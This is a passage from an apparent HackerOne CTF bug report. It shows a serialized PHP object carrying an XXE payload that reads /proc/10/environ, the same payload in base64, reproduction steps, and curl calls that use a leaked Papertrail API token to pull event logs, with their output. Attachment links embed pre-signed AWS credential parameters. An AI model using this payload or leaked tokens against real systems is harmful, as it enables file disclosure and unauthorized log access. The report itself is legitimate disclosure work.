src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/822/cd7ea1c07410de16832a84ec7c15c01729cabffa/1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221518Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=771470716ca7af257ecd507914fa094a3e372d2951014a8818cee9ce7d60fbab\" class=\"markdown-inline-image\"></a></p>\n\n<p>So, as the ideas of this actually being a part of the CTF fading away and having nice previous record of finding and utilizing API-keys, I decided to test the Papertrail token for myself. And how about it? Works!</p>\n\n<p>After some poking around I landed on this:</p>\n<pre class=\"highlight plaintext\"><code>curl -i -H &quot;X-Papertrail-Token: ii6r9Ze-REDACTED&quot; https://papertrailapp.com/api/v1/events/search.json?system_id=23562-REDACTED\nHTTP/1.1 200 OK\nDate: Sat, 29 Sep 2018 11:29:58 GMT\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: SAMEORIGIN\nX-Rate-Limit-Limit: 25\nX-Rate-Limit-Remaining: 24\nX-Rate-Limit-Reset: 2\nX-Shibboleet: if you see this, we&#39;d like to get you a thank you espresso\nX-Runtime: 440\nETag: &quot;6fa205988ad388afc-REDACTED&quot;\nCache-Control: private, max-age=0, must-revalidate\nContent-Length: 636600\nStatus: 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\n    &quot;min_id&quot;: &quot;98264920-REDACTED&quot;,\n    &quot;max_id&quot;: &quot;9826557-REDACTED&quot;,\n    &quot;events&quot;: [{\n            &quot;id&quot;: &quot;9826492-REDACTED&quot;,\n            &quot;source_ip&quot;: &quot;54.205.-REDACTED&quot;,\n            &quot;program&quot;: &quot;heroku/router&quot;,\n            &quot;message&quot;: &quot;at=info method=GET path=\\&quot;/vendor/font-awesome/css/font-awesome.min.css\\&quot; host=h1-5411.h1ctf.com request_id=5fb495c5-7237-455b-b79d--REDACTED fwd=\\&quot;192.130.-REDACTED\\&quot; dyno=web.1 connect=0ms service=3ms status=200 bytes=7354 protocol=https &quot;,\n            &quot;received_at&quot;: &quot;2018-09-29T04:04:09-07:00&quot;,\n            &quot;generated_at&quot;: &quot;2018-09-29T04:04:09-07:00&quot;,\n            &quot;display_received_at&quot;: &quot;Sep 29 04:04:09&quot;,\n            &quot;source_id&quot;: 23562-REDACTED,\n            &quot;source_name&quot;: &quot;h1-5411-2018-ctf&quot;,\n            &quot;hostname&quot;: &quot;h1-5411-2018-ctf&quot;,\n            &quot;severity&quot;: &quot;Info&quot;,\n            &quot;facility&quot;: &quot;Local3&quot;\n        }, {\n            &quot;id&quot;: &quot;982649204-REDACTED&quot;,\n            &quot;source_ip&quot;: &quot;50.19.-REDACTED&quot;,\n            &quot;program&quot;: &quot;heroku/router&quot;,\n            &quot;message&quot;: &quot;at=info method=GET path=\\&quot;/vendor/jquery-easing/jquery.easing.min.js\\&quot; host=h1-5411.h1ctf.com request_id=8d7e3947-cba9-4661-a34c-1b385021600c fwd=\\&quot;192.130.-REDACTED\\&quot; dyno=web.1 connect=1ms service=2ms status=200 bytes=1130 protocol=https &quot;,\n            &quot;received_at&quot;: &quot;2018-09-29T04:04:09-07:00&quot;,\n            &quot;generated_at&quot;: &quot;2018-09-29T04:04:09-07:00&quot;,\n            &quot;display_received_at&quot;: &quot;Sep 29 04:04:09&quot;,\n            &quot;source_id&quot;: 23562-REDACTED,\n            &quot;source_name&quot;: &quot;h1-5411-2018-ctf&quot;,\n            &quot;hostname&quot;: &quot;h1-5411-2018-ctf&quot;,\n            &quot;severity&quot;: &quot;Info&quot;,\n            &quot;facility&quot;: &quot;Local3&quot;\n        },\n........ And so on.\n</code></pre>\n<p>And this particular header caught my eye:</p>\n<pre class=\"highlight plaintext\"><code>X-Shibboleet: if you see this, we&#39;d like to get you a thank you espresso\n</code></pre>\n<p>So here I am, writing a report about this.</p>\n\n<h1 id=\"steps-to-reproduce\">Steps to reproduce</h1>\n\n<p>A good report almost always requires steps to reproduce. My apologies if this is something stupid and the read could be done more elegantly! I&#39;ll also skip the first parts of the challenge, since they&#39;re not neede to reproduce.</p>\n\n<ol>\n<li>Prepare the following serialized PHP-object  with a XXE payloadfor injection\n<code>\na:2:{i:0;s:93:&quot;../data/memes/1538175596-8bc89487fb699b9a757aaeec7cc4f19bdcfcb436cdbeac3389f8a91908721f17.txt&quot;;i:1;O:10:&quot;ConfigFile&quot;:1:{s:10:&quot;config_raw&quot;;s:276:&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &#39;php://filter/convert.base64-encode/resource=file:///proc/10/environ&#39;&gt;]&gt;&lt;meme&gt;&lt;toptext&gt;qwerty&lt;/toptext&gt;&lt;bottomtext&gt;asdasd&lt;/bottomtext&gt;&lt;template&gt;&amp;xxe;&lt;/template&gt;&lt;type&gt;TEXT&lt;/type&gt;&lt;/meme&gt;&quot;;}}\n</code>\n</li>\n</ol>\n\n<p>which is the following base64-string</p>\n<pre class=\"highlight plaintext\"><code>YToyOntpOjA7czo5MzoiLi4vZGF0YS9tZW1lcy8xNTM4MTc1NTk2LThiYzg5NDg3ZmI2OTliOWE3NTdhYWVlYzdjYzRmMTliZGNmY2I0MzZjZGJlYWMzMzg5ZjhhOTE5MDg3MjFmMTcudHh0IjtpOjE7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyNzY6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPjwhRU5USVRZIHh4ZSBTWVNURU0gJ3BocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZmlsZTovLy9wcm9jLzEwL2Vudmlyb24nPl0+PG1lbWU+PHRvcHRleHQ+cXdlcnR5PC90b3B0ZXh0Pjxib3R0b210ZXh0PmFzZGFzZDwvYm90dG9tdGV4dD48dGVtcGxhdGU+Jnh4ZTs8L3RlbXBsYXRlPjx0eXBlPlRFWFQ8L3R5cGU+PC9tZW1lPiI7fX0=\n</code></pre>\n<p>and save it as &quot;memes.memepack&quot; -file</p>\n\n<ol>\n<li>Navigate to <a title=\"https://h1-5411.h1ctf.com/import_memes_2.0.php\" href=\"/redirect?signature=2368abf0d63eaa427aa5fe3b0d986fe588775944&amp;url=https%3A%2F%2Fh1-5411.h1ctf.com%2Fimport_memes_2.0.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://h1-5411.h1ctf.com/import_memes_2.0.php</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Click &quot;Choose file&quot; and open the newly created &quot;memes.memepack&quot;-file</li>\n<li>Open browser developer console or log requests with a proxy</li>\n<li>Click &quot;Import&quot;</li>\n<li>Inspect developer console or proxy, which should look similar to\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"dev_console.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/830/99dcff6792468267bacde2d58dcd905fcb955253/dev_console.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221518Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=ff23330c87fa3d0ae738ea3d88465308f64c298c597626281a4db14b2e522491\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/830/99dcff6792468267bacde2d58dcd905fcb955253/dev_console.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221518Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=ff23330c87fa3d0ae738ea3d88465308f64c298c597626281a4db14b2e522491\" class=\"markdown-inline-image\"></a>\n</li>\n<li>Base64-decode parameter &quot;Template Location&quot; after &quot;=&gt;&quot;, which contains the file /proc/10/environ -file</li>\n<li>Profit! </li>\n<li>Get the Papertrail API-token</li>\n<li>\n<p>Prepare Curl for example as following</p>\n<pre class=\"highlight plaintext\"><code>curl -i -H &quot;X-Papertrail-Token: [INSERT PAPERTRAIL API-TOKEN HERE]&quot;  https://papertrailapp.com/api/v1/events/search.json?q=error\n</code></pre>\n</li>\n<li>\n<p>Inspect that response headers look similar to this:</p>\n<pre class=\"highlight plaintext\"><code>curl -i -H &quot;X-Papertrail-Token: ii6r9Ze-REDACTED&quot; https://papertrailapp.com/api/v1/events/search.json?q=error\nHTTP/1.1 200 OK\nDate: Sat, 29 Sep 2018 13:08:00 GMT\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: SAMEORIGIN\nX-Rate-Limit-Limit: 25\nX-Rate-Limit-Remaining: 24\nX-Rate-Limit-Reset: 5\nX-Shibboleet: if you see this, we&#39;d like to get you a thank you espresso\nX-Runtime: 528\nETag: &quot;7207607ce216ca0fc-REDACTEDc&quot;\nCache-Control: private, max-age=0, must-revalidate\nContent-Length: 498309\nStatus: 200 OK\nContent-Type: application/json; charset=utf-8\n</code></pre>\n</li>\n<li><p>Double profit!</p></li>\n</ol>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>The main impact of this vulnerability seems to be this!</p>\n<pre class=\"highlight plaintext\"><code>X-Shibboleet: if you see this, we&#39;d like to get you a thank you espresso\n</code></pre>\n<p>However, a malicious individual would propably harvest hacker IP-addresses and see what the other CTF contestants are doing on the box using the Papertrail token. Also GPG-keys should be kept private, as Heroku Exec manager-links.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/838/b367ed2c94403b818e15e84af065cda89e5c5759/1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221518Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=efe7396aee986ad9c8185f9399774b0a7ac597651827790fe7b98ba48aa7ab24\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/838/b367ed2c94403b818e15e84af065cda89e5c5759/1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221518Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=efe7396aee986ad9c8185f9399774b0a7ac597651827790fe7b98ba48aa7ab24\" class=\"markdown-inline-image\"></a></p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://tbd.com", 
+            "about": null, 
+            "twitter_handle": null, 
+            "name": "h1-5411-CTF"
+        }, 
+        "handle": "h1-5411-ctf", 
+        "url": "https://hackerone.com/h1-5411-ctf", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/033/314/1a0c110b0060c574d84b531160a0d2c58141ce6e_small.?1537539140", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/033/314/78d6c799326d92d4cad56dc8c1899a7ea55bc7f2_medium.?1537539140"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 33314, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
